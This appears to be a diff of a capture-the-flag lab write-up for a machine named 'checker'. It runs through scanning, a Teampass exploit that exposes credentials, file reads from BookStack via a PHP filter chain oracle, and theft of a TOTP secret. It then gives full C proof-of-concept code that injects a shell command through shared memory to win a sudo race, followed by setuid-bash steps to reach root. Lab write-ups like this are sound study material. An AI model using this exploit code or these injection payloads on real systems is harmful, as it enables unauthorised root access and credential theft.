@@ -1,4 +1,5 @@
-# 1. rustscan
+# User flag
+## 1. rustscan
 ```bash
 # Nmap 7.94SVN scan initiated Wed Feb 26 21:57:19 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80,8080 -sC -sV -oN checker 10.129.148.41
 Nmap scan report for 10.129.148.41
@@ -23,7 +24,7 @@ PORT     STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-# 2. Found Teampass on port 8080
+## 2. Found Teampass on port 8080
 
 Find this POC => https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
 ```bash
@@ -83,12 +84,15 @@ bob@checker.htb
 mYSeCr3T_w1kI_P4sSw0rD
 ```
 
-# 3. Found bookstack on port 80
+## 3. Found bookstack on port 80
 
 => maybe useful https://medium.com/stolabs/bookstack-cve-2020-5256-rce-through-file-upload-870a98228c7a
 => get passwd from teampass
 => find this https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/ and https://fluidattacks.com/advisories/imagination/
 => modify the script and LFR
+
+exploit:
+https://github.com/synacktiv/php_filter_chains_oracle_exploit
 ```bash
 
 #==== modify php_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py =====
@@ -126,8 +130,6 @@ cm9vdDp4OjA6MDpyb290Oi9
 b'root:x:0:0:root:/ <SNIP>'
 
 # we found a script in bookstack takling about back, check out backup
-
-
 read the file: /backup/home_backup/home/reader/.google_authenticator
 b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
 
@@ -135,10 +137,119 @@ b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
 ┌──(kali㉿kali)-[~]
 └─$ qr "otpauth://totp/reader?secret=DVDBRAODLCWF7I2ONA4K5LQLUE" 
 
-get qrcode an gen totp to login
-
-get user flag
+1. get qrcode and gen totp to login
+2. get user flag
 
 reader@checker:~$ ls
 user.txt
+```
+
+# root flag
+## 1. sudo -l
+```bash
+reader@checker:~$ sudo -l
+Matching Defaults entries for reader on checker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User reader may run the following commands on checker:
+    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
+```
+
+POC: 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+#include <time.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SHARED_MEM_SIZE 0x400    // 1024 bytes
+#define SHARED_MEM_PERMS 0x3B6   // Permissions: 0666 in octal
+#define KEY_MAX_VALUE 0xfffff    // Maximum key value
+
+static void remove_shared_memory(int shared_mem_id) {
+    if (shmctl(shared_mem_id, IPC_RMID, NULL) == -1) {
+        fprintf(stderr, "Failed to remove shared memory (ID: %d): %s\n", 
+                shared_mem_id, strerror(errno));
+    }
+}
+
+int main(void) {
+    int shared_mem_id;
+    char *shared_mem_ptr;
+    
+	# /////////////  put your cmd here ////////////////
+    const char *message_payload = "Leaked hash detected at Sat Feb 22 23:21:48 2025 > '; chown root /tmp/rootbash;#";
+    
+    // Use current time for random seed
+    srand((unsigned int)time(NULL));
+    key_t memory_key = rand() % KEY_MAX_VALUE;
+    printf("[+] Generated shared memory key: 0x%X\n", memory_key);
+
+    // Create shared memory
+    shared_mem_id = shmget(memory_key, SHARED_MEM_SIZE, IPC_CREAT | SHARED_MEM_PERMS);
+    if (shared_mem_id == -1) {
+        fprintf(stderr, "Failed to create shared memory segment: %s\n"
+                "Key: 0x%X, Size: %d bytes, Permissions: 0%o\n",
+                strerror(errno), memory_key, SHARED_MEM_SIZE, SHARED_MEM_PERMS);
+        return EXIT_FAILURE;
+    }
+    printf("[+] Successfully created shared memory segment (ID: %d)\n", shared_mem_id);
+
+    // Attach to shared memory
+    shared_mem_ptr = shmat(shared_mem_id, NULL, 0);
+    if (shared_mem_ptr == (char *)-1) {
+        fprintf(stderr, "Failed to attach to shared memory segment (ID: %d): %s\n",
+                shared_mem_id, strerror(errno));
+        remove_shared_memory(shared_mem_id);
+        return EXIT_FAILURE;
+    }
+    printf("[+] Successfully attached to shared memory segment\n");
+
+    // Write payload to shared memory with bounds checking
+    int written_bytes = snprintf(shared_mem_ptr, SHARED_MEM_SIZE, "%s", message_payload);
+    if (written_bytes >= SHARED_MEM_SIZE) {
+        fprintf(stderr, "Warning: Payload truncated! Required %d bytes, but only %d available\n",
+                written_bytes, SHARED_MEM_SIZE);
+    }
+    printf("[+] Written %d bytes to shared memory\n", written_bytes);
+    printf("[+] Shared Memory Content:\n%s\n", shared_mem_ptr);
+
+    // Cleanup
+    if (shmdt(shared_mem_ptr) == -1) {
+        fprintf(stderr, "Failed to detach from shared memory segment (ID: %d): %s\n",
+                shared_mem_id, strerror(errno));
+        remove_shared_memory(shared_mem_id);
+        return EXIT_FAILURE;
+    }
+    printf("[+] Successfully detached from shared memory segment\n");
+
+    remove_shared_memory(shared_mem_id);
+    printf("[+] Cleanup completed\n");
+    
+    return EXIT_SUCCESS;
+}
+
+
+1. gcc -o poc poc.c 
+2. chmod +x ./poc 
+3. cp /bin/bash /tmp/rootbash 
+4. chmod +s /tmp/rootbash # 開兩個視窗，個別執行以下兩個指令 
+5. while true; do ./poc ; done 
+6. while true; do sudo /opt/hash-checker/check-leak.sh bob ; done 
+
+ # 等待幾秒後，執行以下指令
+6. ls -al /tmp/rootbash 
+7. /tmp/rootbash -p
+
+
+
+reader@checker:/tmp$ ./rootbash -p
+rootbash-5.1# id
+uid=1000(reader) gid=1000(reader) euid=0(root) groups=1000(reader)
+rootbash-5.1# cat /root/root.txt
 ```
